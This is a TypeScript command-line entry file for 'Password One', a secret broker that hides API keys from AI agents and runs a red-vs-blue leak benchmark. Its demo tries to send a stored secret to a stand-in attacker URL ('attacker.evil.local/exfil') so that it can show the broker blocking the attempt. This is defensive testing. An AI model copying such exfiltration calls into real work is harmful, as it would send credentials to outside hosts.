#!/usr/bin/env node
import { realpathSync } from 'node:fs';
import {
  createServer,
  request as httpRequest,
  type IncomingMessage,
  type OutgoingHttpHeaders,
  type ServerResponse,
} from 'node:http';
import { request as httpsRequest } from 'node:https';
import type { AddressInfo } from 'node:net';
import { resolve } from 'node:path';
import type { Readable, Writable } from 'node:stream';
import { fileURLToPath } from 'node:url';
import { runRedBlueBenchmark, type BenchmarkReport } from './benchmark.ts';
import { PasswordOneBroker } from './broker.ts';
import { runMcpServer } from './mcp.ts';
import { DEFAULT_HOST, DEFAULT_PORT, startPasswordOneServer } from './server.ts';
import type { HttpAuthBinding, ProxyExecRequest, ProxyHttpRequest } from './types.ts';
import { PasswordOneVault } from './vault.ts';

function formatBenchmarkTable(report: BenchmarkReport): string {
  const lines: string[] = [];
  lines.push('====================================================================================================');
  lines.push(`Password One (@opc/password-one) — Red-vs-Blue Security & Performance Benchmark (${report.nodeVersion})`);
  lines.push('====================================================================================================');
  lines.push('');
  lines.push('Scenario Matrix (S1 - S8):');
  lines.push('----------------------------------------------------------------------------------------------------');
  lines.push(
    `${'ID'.padEnd(4)} | ${'Scenario'.padEnd(48)} | ${'Raw Env'.padEnd(11)} | ${'Naive Sub'.padEnd(11)} | ${'Password One'.padEnd(12)}`
  );
  lines.push('----------------------------------------------------------------------------------------------------');

  for (const s of report.scenarios) {
    const fmt = (ok: boolean, isS8: boolean): string =>
      isS8 ? (ok ? 'OK (100%)' : 'FAILED') : ok ? 'DEFENDED' : 'LEAKED';
    const isS8 = s.id === 'S8';
    lines.push(
      `${s.id.padEnd(4)} | ${s.name.slice(0, 48).padEnd(48)} | ${fmt(s.raw_env_agent.defended, isS8).padEnd(11)} | ${fmt(s.naive_placeholder_broker.defended, isS8).padEnd(11)} | ${fmt(s.password_one.defended, isS8).padEnd(12)}`
    );
  }
  lines.push('----------------------------------------------------------------------------------------------------');
  lines.push('');
  lines.push('Architecture Scorecards:');
  for (const [arch, card] of Object.entries(report.scorecards)) {
    lines.push(
      `  - ${arch.padEnd(26)}: Defended ${card.attacksDefended}/${card.attackScenariosTotal} (${card.attackDefenseRatePct}%), ` +
        `LLM Context Exposures=${card.llmContextSecretExposures}, Authorized Success=${card.authorizedWorkflowSuccessRatePct}%`
    );
  }
  lines.push('');
  lines.push('Micro-Benchmark Latency:');
  const p = report.performance;
  lines.push(
    `  - Envelope Encrypt + Policy AAD : mean=${p.envelopeEncryptAadUs.meanUs}us | p50=${p.envelopeEncryptAadUs.p50Us}us | p95=${p.envelopeEncryptAadUs.p95Us}us`
  );
  lines.push(
    `  - Envelope Decrypt + AAD Verify : mean=${p.envelopeDecryptAadVerifyUs.meanUs}us | p50=${p.envelopeDecryptAadVerifyUs.p50Us}us | p95=${p.envelopeDecryptAadVerifyUs.p95Us}us`
  );
  lines.push(
    `  - 6-Encoding Scrubber (2KB JSON): mean=${p.sixEncodingScrub2KbUs.meanUs}us | p50=${p.sixEncodingScrub2KbUs.p50Us}us | p95=${p.sixEncodingScrub2KbUs.p95Us}us`
  );
  lines.push(
    `  - SHA-256 Audit Chain Verify    : mean=${p.auditChainVerifyUs.meanUs}us | p50=${p.auditChainVerifyUs.p50Us}us | p95=${p.auditChainVerifyUs.p95Us}us`
  );
  lines.push(`  - End-to-End Blind HTTP Proxy   : mean=${p.endToEndHttpBrokerMeanMs}ms`);
  lines.push(
    `  - Audit Ledger Integrity        : valid=${report.auditChainIntegrity.valid} (${report.auditChainIntegrity.entriesChecked} entries, head=${report.auditChainIntegrity.headHash.slice(0, 16)}...)`
  );
  lines.push('====================================================================================================');
  return lines.join('\n');
}

async function runDemo(): Promise<void> {
  console.log('--- Password One (@opc/password-one) End-to-End Live Demo ---');
  const upstream = createServer((req: IncomingMessage, res: ServerResponse) => {
    const auth = req.headers['authorization'] ?? '';
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(
      JSON.stringify({
        ok: true,
        message: 'Payment authorized',
        echoedDebugAuth: auth,
        echoedBasic: `Basic ${Buffer.from(`agent:${String(auth).replace('Bearer ', '')}`).toString('base64')}`,
      })
    );
  });
  await new Promise<void>((resolve) => upstream.listen(0, '127.0.0.1', resolve));
  const upstreamPort = (upstream.address() as AddressInfo).port;

  const vault = new PasswordOneVault({
    dbPath: ':memory:',
    masterKey: 'demo-ephemeral-master-key-2026',
    scryptN: 1024,
  });

  try {
    const meta = vault.upsertSecret({
      alias: 'stripe/prod_key',
      value: 'sk_' + 'live_DemoUltraSecretKey998877',
      description: 'Demo Stripe API Key',
      policy: {
        allowedHosts: ['api.stripe.internal'],
        allowedTools: ['http'],
        allowHttp: true,
        requireGrant: true,
      },
    });
    console.log('1. Stored AAD-Bound Secret Handle (LLM View):', JSON.stringify(meta, null, 2));

    const grant = vault.createGrant({
      alias: 'stripe/prod_key',
      agentId: 'agent-worker-demo',
      maxUses: 2,
      ttlSeconds: 120,
    });
    console.log('2. Issued Scoped Short-Lived Lease:', grant.grantId);

    const broker = new PasswordOneBroker(vault, {
      resolveOverrides: {
        'api.stripe.internal': { address: '127.0.0.1', port: upstreamPort },
      },
    });

    try {
      await broker.executeHttp({
        url: 'http://attacker.evil.local/exfil',
        auth: { type: 'bearer', secret: 'pw1://stripe/prod_key' },
        agentId: 'agent-worker-demo',
        grantId: grant.grantId,
      });
    } catch (err) {
      console.log('3. Confused-Deputy SSRF Blocked:', err instanceof Error ? err.message : String(err));
    }

    const res = await broker.executeHttp({
      url: 'http://api.stripe.internal/v1/pay',
      method: 'POST',
      auth: { type: 'bearer', secret: 'pw1://stripe/prod_key' },
      agentId: 'agent-worker-demo',
      grantId: grant.grantId,
    });
    console.log('4. Authorized Blind HTTP Result (Multi-Encoding Echo Scrubbed):', res.body);
    console.log('   Redactions Count:', res.redactionsCount, '| Aliases:', res.redactedAliases);

    const audit = vault.verifyAuditChain();
    console.log('5. SHA-256 Hash-Chained Audit Verification:', JSON.stringify(audit));
  } finally {
    vault.close();
    await new Promise<void>((resolve) => upstream.close(() => resolve()));
  }
}

export const DEFAULT_CLI_TIMEOUT_MS = 30_000;
const MAX_CLI_RESPONSE_BYTES = 16 * 1024 * 1024;
export const REMOTE_CLI_COMMANDS = new Set(['handles', 'http', 'exec', 'scrub', 'audit-verify']);

export interface RemoteCliIo {
  stdin?: Readable;
  stdout?: Writable | null;
  stderr?: Writable | null;
}

export interface RemoteCliResult {
  exitCode: number;
  statusCode?: number;
  stdout: string;
  stderr: string;
}

class CliUsageError extends Error {
  readonly code: string;

  constructor(code: string, message: string) {
    super(message);
    this.name = 'CliUsageError';
    this.code = code;
  }
}

function collectSensitiveEnvValues(env: Record<string, string | undefined>): string[] {
  const seen = new Set<string>();
  const add = (raw?: string): void => {
    if (!raw) return;
    if (raw.length >= 3) seen.add(raw);
    const trimmed = raw.trim();
    if (trimmed.length >= 3) seen.add(trimmed);
    for (const part of raw.split(/[\r\n]+/)) {
      const p = part.trim();
      if (p.length >= 3) seen.add(p);
    }
  };
  add(env.PW1_BROKER_TOKEN);
  add(env.PW1_AUTH_TOKEN);
  add(env.PW1_MASTER_KEY);
  return Array.from(seen).sort((a, b) => b.length - a.length);
}

function sanitizeCliText(text: string, sensitiveTokens: readonly string[]): string {
  let out = text.replace(/\bauthorization\s*:\s*bearer\s+[^\s"',}\]]+/gi, 'Authorization: [REDACTED]');
  out = out.replace(/\bauthorization\s*:\s*[^\r\n"',}\]]+/gi, 'Authorization: [REDACTED]');
  for (const tok of sensitiveTokens) {
    if (tok && out.includes(tok)) {
      out = out.split(tok).join('[REDACTED:pw1_token]');
    }
  }
  return out;
}

function sanitizeJsonValue(value: unknown, sensitiveTokens: readonly string[]): unknown {
  if (typeof value === 'string') {
    return sanitizeCliText(value, sensitiveTokens);
  }
  if (Array.isArray(value)) {
    return value.map((item) => sanitizeJsonValue(item, sensitiveTokens));
  }
  if (value && typeof value === 'object') {
    const out: Record<string, unknown> = {};
    for (const [k, v] of Object.entries(value as Record<string, unknown>)) {
      out[sanitizeCliText(k, sensitiveTokens)] = sanitizeJsonValue(v, sensitiveTokens);
    }
    return out;
  }
  return value;
}

function resolveCliAuthToken(env: Record<string, string | undefined>): string | undefined {
  const rawBroker = env.PW1_BROKER_TOKEN;
  if (rawBroker !== undefined && rawBroker.length > 0) {
    if (/[\r\n]/.test(rawBroker)) {
      throw new CliUsageError('INVALID_INPUT', 'PW1_BROKER_TOKEN must not contain CR/LF characters');
    }
    const trimmed = rawBroker.trim();
    if (trimmed.length > 0) {
      return trimmed;
    }
  }

  const rawAuth = env.PW1_AUTH_TOKEN;
  if (rawAuth !== undefined && rawAuth.length > 0) {
    if (/[\r\n]/.test(rawAuth)) {
      throw new CliUsageError('INVALID_INPUT', 'PW1_AUTH_TOKEN must not contain CR/LF characters');
    }
    const trimmed = rawAuth.trim();
    if (trimmed.length > 0) {
      return trimmed;
    }
  }

  return undefined;
}

function buildRemoteEndpointUrl(
  rawBaseUrl: string | undefined,
  endpointPath: string,
  query?: URLSearchParams
): URL {
  const baseStr = rawBaseUrl?.trim() || `http://${DEFAULT_HOST}:${DEFAULT_PORT}`;
  let baseUrl: URL;
  try {
    baseUrl = new URL(baseStr);
  } catch {
    throw new CliUsageError('INVALID_INPUT', 'Invalid PW1_URL configuration');
  }
  if (baseUrl.protocol !== 'http:' && baseUrl.protocol !== 'https:') {
    throw new CliUsageError(
      'INVALID_INPUT',
      `Unsupported PW1_URL protocol "${baseUrl.protocol}"; expected http: or https:`
    );
  }
  const basePrefix = baseUrl.pathname === '/' ? '' : baseUrl.pathname.replace(/\/+$/, '');
  const target = new URL(`${basePrefix}${endpointPath}`, baseUrl.origin);
  if (query) {
    for (const [k, v] of query.entries()) {
      target.searchParams.set(k, v);
    }
  }
  return target;
}

function parsePositiveIntFlag(flag: string, raw: string): number {
  const trimmed = raw.trim();
  if (!/^\d+$/.test(trimmed)) {
    throw new CliUsageError('INVALID_INPUT', `Flag ${flag} must be a positive integer`);
  }
  const n = Number(trimmed);
  if (!Number.isSafeInteger(n) || n <= 0) {
    throw new CliUsageError('INVALID_INPUT', `Flag ${flag} must be a positive integer`);
  }
  return n;
}

function parseKeyValuePair(flag: string, raw: string, sep: string, allowEmptyValue: boolean): [string, string] {
  const idx = raw.indexOf(sep);
  if (idx === -1) {
    throw new CliUsageError('INVALID_INPUT', `Flag ${flag} must contain "${sep}"`);
  }
  const key = raw.slice(0, idx).trim();
  const value = sep === ':' ? raw.slice(idx + 1).trimStart() : raw.slice(idx + 1);
  if (!key) {
    throw new CliUsageError('INVALID_INPUT', `Flag ${flag} requires a non-empty name before "${sep}"`);
  }
  if (!allowEmptyValue && value.length === 0) {
    throw new CliUsageError('INVALID_INPUT', `Flag ${flag} requires a non-empty value after "${sep}"`);
  }
  return [key, value];
}

function splitFlagToken(token: string): { flag: string; inlineVal: string | undefined } {
  const eqIdx = token.indexOf('=');
  if (eqIdx === -1) {
    return { flag: token, inlineVal: undefined };
  }
  return { flag: token.slice(0, eqIdx), inlineVal: token.slice(eqIdx + 1) };
}

async function readStreamUtf8(stream: Readable): Promise<string> {
  const chunks: Buffer[] = [];
  for await (const chunk of stream) {
    chunks.push(typeof chunk === 'string' ? Buffer.from(chunk, 'utf8') : chunk);
  }
  return Buffer.concat(chunks).toString('utf8');
}

async function sendRemoteJsonRequest(params: {
  url: URL;
  method: 'GET' | 'POST';
  token?: string;
  body?: unknown;
  timeoutMs: number;
}): Promise<{ statusCode: number; text: string }> {
  const payload = params.body !== undefined ? JSON.stringify(params.body) : undefined;
  const headers: OutgoingHttpHeaders = {
    accept: 'application/json',
  };
  if (params.token) {
    headers['authorization'] = `Bearer ${params.token}`;
  }
  if (payload !== undefined) {
    headers['content-type'] = 'application/json; charset=utf-8';
    headers['content-length'] = Buffer.byteLength(payload, 'utf8');
  }

  const transport = params.url.protocol === 'https:' ? httpsRequest : httpRequest;

  return new Promise((resolvePromise, rejectPromise) => {
    let settled = false;
    let resRef: IncomingMessage | undefined;

    const finishResolve = (result: { statusCode: number; text: string }): void => {
      if (settled) return;
      settled = true;
      clearTimeout(hardTimer);
      resolvePromise(result);
    };

    const finishReject = (err: Error): void => {
      if (settled) return;
      settled = true;
      clearTimeout(hardTimer);
      rejectPromise(err);
    };

    const req = transport(
      params.url,
      {
        method: params.method,
        headers,
      },
      (res: IncomingMessage) => {
        resRef = res;
        const chunks: Buffer[] = [];
        let totalBytes = 0;

        res.on('data', (chunk: Buffer | string) => {
          const buf = typeof chunk === 'string' ? Buffer.from(chunk, 'utf8') : chunk;
          totalBytes += buf.length;
          if (totalBytes > MAX_CLI_RESPONSE_BYTES) {
            res.destroy();
            req.destroy();
            finishReject(new CliUsageError('RESPONSE_TOO_LARGE', 'Server response exceeded 16MB limit'));
            return;
          }
          chunks.push(buf);
        });

        res.on('end', () => {
          finishResolve({
            statusCode: res.statusCode ?? 0,
            text: Buffer.concat(chunks).toString('utf8'),
          });
        });

        res.on('error', (err: Error) => {
          finishReject(err);
        });
      }
    );

    const onTimeout = (): void => {
      const timeoutErr = new CliUsageError(
        'TIMEOUT',
        `Request to Password One timed out after ${params.timeoutMs}ms`
      );
      resRef?.destroy(timeoutErr);
      req.destroy(timeoutErr);
      finishReject(timeoutErr);
    };

    const hardTimer = setTimeout(onTimeout, params.timeoutMs);
    req.setTimeout(params.timeoutMs, onTimeout);
    req.on('error', (err: Error) => {
      finishReject(err);
    });

    if (payload !== undefined) {
      req.write(payload, 'utf8');
    }
    req.end();
  });
}

function resolveClientTimeoutMs(env: Record<string, string | undefined>, payloadTimeoutMs?: number): number {
  const rawEnvTimeout = env.PW1_TIMEOUT_MS?.trim();
  if (rawEnvTimeout) {
    return parsePositiveIntFlag('PW1_TIMEOUT_MS', rawEnvTimeout);
  }
  if (payloadTimeoutMs !== undefined) {
    return Math.max(DEFAULT_CLI_TIMEOUT_MS, payloadTimeoutMs + 5_000);
  }
  return DEFAULT_CLI_TIMEOUT_MS;
}

export async function runRemoteCli(
  argv: readonly string[],
  env: Record<string, string | undefined> = process.env,
  io?: RemoteCliIo
): Promise<RemoteCliResult> {
  const sensitiveTokens = collectSensitiveEnvValues(env);
  const inStream = io?.stdin ?? process.stdin;
  const outStream = io === undefined ? process.stdout : io.stdout;
  const errStream = io === undefined ? process.stderr : io.stderr;

  const emitError = (code: string, message: string, statusCode?: number): RemoteCliResult => {
    const payload = sanitizeJsonValue(
      statusCode !== undefined
        ? { ok: false, status: statusCode, error: { code, message } }
        : { ok: false, error: { code, message } },
      sensitiveTokens
    );
    const stderrText = `${JSON.stringify(payload, null, 2)}\n`;
    errStream?.write(stderrText);
    return { exitCode: 1, statusCode, stdout: '', stderr: stderrText };
  };

  try {
    const subcommand = argv[0] ?? '';
    const rest = argv.slice(1);
    if (!REMOTE_CLI_COMMANDS.has(subcommand)) {
      return emitError('INVALID_INPUT', `Unknown remote subcommand "${subcommand}"`);
    }

    const token = resolveCliAuthToken(env);

    let method: 'GET' | 'POST' = 'GET';
    let endpointPath = '';
    let queryParams: URLSearchParams | undefined;
    let body: unknown = undefined;
    let payloadTimeoutMs: number | undefined;

    if (subcommand === 'handles') {
      if (rest.length > 0) {
        throw new CliUsageError('INVALID_INPUT', `Unexpected argument for handles: ${rest[0]}`);
      }
      method = 'GET';
      endpointPath = '/v1/handles';
    } else if (subcommand === 'audit-verify') {
      let limit: number | undefined;
      for (let i = 0; i < rest.length; i++) {
        const { flag, inlineVal } = splitFlagToken(rest[i]!);
        const takeValue = (): string => {
          if (inlineVal !== undefined) return inlineVal;
          if (i + 1 >= rest.length) {
            throw new CliUsageError('INVALID_INPUT', `Missing value for flag ${flag}`);
          }
          i += 1;
          return rest[i]!;
        };
        if (flag === '--limit') {
          limit = parsePositiveIntFlag('--limit', takeValue());
        } else {
          throw new CliUsageError('INVALID_INPUT', `Unknown flag for audit-verify: ${flag}`);
        }
      }
      method = 'GET';
      endpointPath = '/v1/audit';
      if (limit !== undefined) {
        queryParams = new URLSearchParams({ limit: String(limit) });
      }
    } else if (subcommand === 'scrub') {
      let hasText = false;
      let textValue = '';
      for (let i = 0; i < rest.length; i++) {
        const { flag, inlineVal } = splitFlagToken(rest[i]!);
        const takeValue = (): string => {
          if (inlineVal !== undefined) return inlineVal;
          if (i + 1 >= rest.length) {
            throw new CliUsageError('INVALID_INPUT', `Missing value for flag ${flag}`);
          }
          i += 1;
          return rest[i]!;
        };
        if (flag === '--text') {
          textValue = takeValue();
          hasText = true;
        } else {
          throw new CliUsageError('INVALID_INPUT', `Unknown flag for scrub: ${flag}`);
        }
      }
      if (!hasText) {
        textValue = await readStreamUtf8(inStream);
      }
      method = 'POST';
      endpointPath = '/v1/scrub';
      body = { text: textValue };
    } else if (subcommand === 'http') {
      let urlValue: string | undefined;
      let httpMethod = 'GET';
      const headersMap: Record<string, string> = {};
      const queryMap: Record<string, string> = {};
      let bodyValue: string | undefined;
      let authBinding: HttpAuthBinding | undefined;
      let agentId: string | undefined;
      let grantId: string | undefined;
      let timeoutMs: number | undefined;

      const setAuth = (binding: HttpAuthBinding): void => {
        if (authBinding !== undefined) {
          throw new CliUsageError(
            'INVALID_INPUT',
            'Only one of --auth-bearer, --auth-header, --auth-basic, or --auth-query may be specified'
          );
        }
        authBinding = binding;
      };

      for (let i = 0; i < rest.length; i++) {
        const { flag, inlineVal } = splitFlagToken(rest[i]!);
        const takeValue = (): string => {
          if (inlineVal !== undefined) return inlineVal;
          if (i + 1 >= rest.length) {
            throw new CliUsageError('INVALID_INPUT', `Missing value for flag ${flag}`);
          }
          i += 1;
          return rest[i]!;
        };

        switch (flag) {
          case '--url':
            urlValue = takeValue();
            break;
          case '--method': {
            const m = takeValue().trim().toUpperCase();
            if (!m) throw new CliUsageError('INVALID_INPUT', 'Flag --method requires a non-empty HTTP method');
            httpMethod = m;
            break;
          }
          case '--header': {
            const [hk, hv] = parseKeyValuePair('--header', takeValue(), ':', true);
            headersMap[hk] = hv;
            break;
          }
          case '--query': {
            const [qk, qv] = parseKeyValuePair('--query', takeValue(), '=', true);
            queryMap[qk] = qv;
            break;
          }
          case '--body':
            bodyValue = takeValue();
            break;
          case '--auth-bearer': {
            const secret = takeValue().trim();
            if (!secret) throw new CliUsageError('INVALID_INPUT', 'Flag --auth-bearer requires a secret handle');
            setAuth({ type: 'bearer', secret });
            break;
          }
          case '--auth-header': {
            const [headerName, secret] = parseKeyValuePair('--auth-header', takeValue(), '=', false);
            setAuth({ type: 'header', headerName, secret });
            break;
          }
          case '--auth-basic': {
            const rawBasic = takeValue();
            const colonIdx = rawBasic.indexOf(':');
            if (colonIdx === -1) {
              throw new CliUsageError('INVALID_INPUT', 'Flag --auth-basic must be formatted as "<user>:<pw1://alias>"');
            }
            const username = rawBasic.slice(0, colonIdx);
            const secret = rawBasic.slice(colonIdx + 1);
            if (!secret) {
              throw new CliUsageError('INVALID_INPUT', 'Flag --auth-basic requires a secret handle after ":"');
            }
            setAuth({ type: 'basic', username, secret });
            break;
          }
          case '--auth-query': {
            const [paramName, secret] = parseKeyValuePair('--auth-query', takeValue(), '=', false);
            setAuth({ type: 'query', paramName, secret });
            break;
          }
          case '--agent-id':
            agentId = takeValue();
            break;
          case '--grant-id':
            grantId = takeValue();
            break;
          case '--timeout-ms':
            timeoutMs = parsePositiveIntFlag('--timeout-ms', takeValue());
            break;
          default:
            throw new CliUsageError('INVALID_INPUT', `Unknown flag for http: ${flag}`);
        }
      }

      if (!urlValue) {
        throw new CliUsageError('INVALID_INPUT', 'Flag --url is required for http');
      }

      const payload: ProxyHttpRequest = {
        url: urlValue,
        method: httpMethod,
      };
      if (Object.keys(headersMap).length > 0) payload.headers = headersMap;
      if (Object.keys(queryMap).length > 0) payload.query = queryMap;
      if (bodyValue !== undefined) payload.body = bodyValue;
      if (authBinding !== undefined) payload.auth = authBinding;
      if (agentId !== undefined) payload.agentId = agentId;
      if (grantId !== undefined) payload.grantId = grantId;
      if (timeoutMs !== undefined) {
        payload.timeoutMs = timeoutMs;
        payloadTimeoutMs = timeoutMs;
      }

      method = 'POST';
      endpointPath = '/v1/proxy/http';
      body = payload;
    } else if (subcommand === 'exec') {
      let commandValue: string | undefined;
      const execArgs: string[] = [];
      const secretEnvMap: Record<string, string> = {};
      const envMap: Record<string, string> = {};
      let cwdValue: string | undefined;
      let timeoutMs: number | undefined;
      let agentId: string | undefined;
      let grantId: string | undefined;

      for (let i = 0; i < rest.length; i++) {
        const { flag, inlineVal } = splitFlagToken(rest[i]!);
        const takeValue = (): string => {
          if (inlineVal !== undefined) return inlineVal;
          if (i + 1 >= rest.length) {
            throw new CliUsageError('INVALID_INPUT', `Missing value for flag ${flag}`);
          }
          i += 1;
          return rest[i]!;
        };

        switch (flag) {
          case '--command':
            commandValue = takeValue();
            break;
          case '--arg':
            execArgs.push(takeValue());
            break;
          case '--secret-env': {
            const [ek, ev] = parseKeyValuePair('--secret-env', takeValue(), '=', false);
            secretEnvMap[ek] = ev;
            break;
          }
          case '--env': {
            const [ek, ev] = parseKeyValuePair('--env', takeValue(), '=', true);
            envMap[ek] = ev;
            break;
          }
          case '--cwd':
            cwdValue = takeValue();
            break;
          case '--timeout-ms':
            timeoutMs = parsePositiveIntFlag('--timeout-ms', takeValue());
            break;
          case '--agent-id':
            agentId = takeValue();
            break;
          case '--grant-id':
            grantId = takeValue();
            break;
          default:
            throw new CliUsageError('INVALID_INPUT', `Unknown flag for exec: ${flag}`);
        }
      }

      if (!commandValue) {
        throw new CliUsageError('INVALID_INPUT', 'Flag --command is required for exec');
      }

      const payload: ProxyExecRequest = {
        command: commandValue,
      };
      if (execArgs.length > 0) payload.args = execArgs;
      if (Object.keys(secretEnvMap).length > 0) payload.secretEnv = secretEnvMap;
      if (Object.keys(envMap).length > 0) payload.env = envMap;
      if (cwdValue !== undefined) payload.cwd = cwdValue;
      if (timeoutMs !== undefined) {
        payload.timeoutMs = timeoutMs;
        payloadTimeoutMs = timeoutMs;
      }
      if (agentId !== undefined) payload.agentId = agentId;
      if (grantId !== undefined) payload.grantId = grantId;

      method = 'POST';
      endpointPath = '/v1/proxy/exec';
      body = payload;
    }

    const targetUrl = buildRemoteEndpointUrl(env.PW1_URL, endpointPath, queryParams);
    const clientTimeoutMs = resolveClientTimeoutMs(env, payloadTimeoutMs);
    const response = await sendRemoteJsonRequest({
      url: targetUrl,
      method,
      token,
      body,
      timeoutMs: clientTimeoutMs,
    });

    let parsedBody: unknown;
    let parsedOk = false;
    if (response.text.trim().length > 0) {
      try {
        parsedBody = JSON.parse(response.text);
        parsedOk = true;
      } catch {
        parsedOk = false;
      }
    }

    if (response.statusCode >= 200 && response.statusCode < 300) {
      if (!parsedOk) {
        return emitError('INVALID_RESPONSE', 'Password One server returned non-JSON response', response.statusCode);
      }
      const sanitized = sanitizeJsonValue(parsedBody, sensitiveTokens);
      const stdoutText = `${JSON.stringify(sanitized, null, 2)}\n`;
      outStream?.write(stdoutText);
      return {
        exitCode: 0,
        statusCode: response.statusCode,
        stdout: stdoutText,
        stderr: '',
      };
    }

    if (parsedOk && parsedBody && typeof parsedBody === 'object' && !Array.isArray(parsedBody)) {
      const obj = parsedBody as Record<string, unknown>;
      const nestedErr =
        obj.error && typeof obj.error === 'object' && !Array.isArray(obj.error)
          ? (obj.error as Record<string, unknown>)
          : undefined;
      const errCode = typeof nestedErr?.code === 'string' ? nestedErr.code : 'HTTP_ERROR';
      const errMsg =
        typeof nestedErr?.message === 'string'
          ? nestedErr.message
          : `HTTP request failed with status ${response.statusCode}`;
      return emitError(errCode, errMsg, response.statusCode);
    }

    const snippet = response.text.trim().slice(0, 240);
    return emitError(
      'HTTP_ERROR',
      snippet ? `HTTP ${response.statusCode}: ${snippet}` : `HTTP request failed with status ${response.statusCode}`,
      response.statusCode
    );
  } catch (err) {
    if (err instanceof CliUsageError) {
      return emitError(err.code, err.message);
    }
    let rawMsg = 'Network request failed';
    if (err instanceof Error) {
      if (err.message) {
        rawMsg = err.message;
      } else {
        const aggErrors = (err as { errors?: unknown }).errors;
        const firstSub = Array.isArray(aggErrors) && aggErrors[0] instanceof Error ? aggErrors[0].message : '';
        const errCode = (err as { code?: unknown }).code;
        rawMsg = firstSub || (typeof errCode === 'string' && errCode ? `Network error (${errCode})` : err.name || rawMsg);
      }
    }
    return emitError('NETWORK_ERROR', rawMsg);
  }
}

async function main(): Promise<void> {
  const args = process.argv.slice(2);
  const subcommand = args[0] ?? 'serve';

  if (subcommand === 'serve' || subcommand === 'start') {
    const running = await startPasswordOneServer();
    console.log(
      `[password-one] Listening on ${running.baseUrl} (auth=${running.authEnabled ? 'bearer' : 'disabled-loopback'}, brokerAuth=${running.brokerAuthEnabled ? 'enabled' : 'disabled'}, mcp=${running.baseUrl}/mcp, default=${DEFAULT_HOST}:${DEFAULT_PORT}, db=${running.vault.dbPath})`
    );
    const shutdown = (): void => {
      void running.close().then(() => process.exit(0));
    };
    process.on('SIGINT', shutdown);
    process.on('SIGTERM', shutdown);
    return;
  }

  if (subcommand === 'mcp') {
    await runMcpServer();
    return;
  }

  if (subcommand === 'benchmark') {
    const report = await runRedBlueBenchmark();
    if (args.includes('--json')) {
      console.log(JSON.stringify(report, null, 2));
    } else {
      console.log(formatBenchmarkTable(report));
    }
    return;
  }

  if (subcommand === 'demo') {
    await runDemo();
    return;
  }

  if (REMOTE_CLI_COMMANDS.has(subcommand)) {
    const result = await runRemoteCli(args, process.env, {
      stdin: process.stdin,
      stdout: process.stdout,
      stderr: process.stderr,
    });
    if (result.exitCode !== 0) {
      process.exit(result.exitCode);
    }
    return;
  }

  console.error(
    `Usage: password-one <serve|mcp|benchmark [--json]|demo|handles|http|exec|scrub|audit-verify>`
  );
  process.exit(1);
}

function isMainModule(): boolean {
  const entry = process.argv[1];
  if (!entry) return false;
  try {
    return realpathSync(resolve(entry)) === realpathSync(fileURLToPath(import.meta.url));
  } catch {
    return resolve(entry) === fileURLToPath(import.meta.url);
  }
}

if (isMainModule()) {
  main().catch((err: unknown) => {
    const sensitiveTokens = collectSensitiveEnvValues(process.env);
    const rawMsg = err instanceof Error ? err.message : String(err);
    const msg = sanitizeCliText(rawMsg, sensitiveTokens);
    console.error(`[password-one] Startup error: ${msg}`);
    process.exit(1);
  });
}
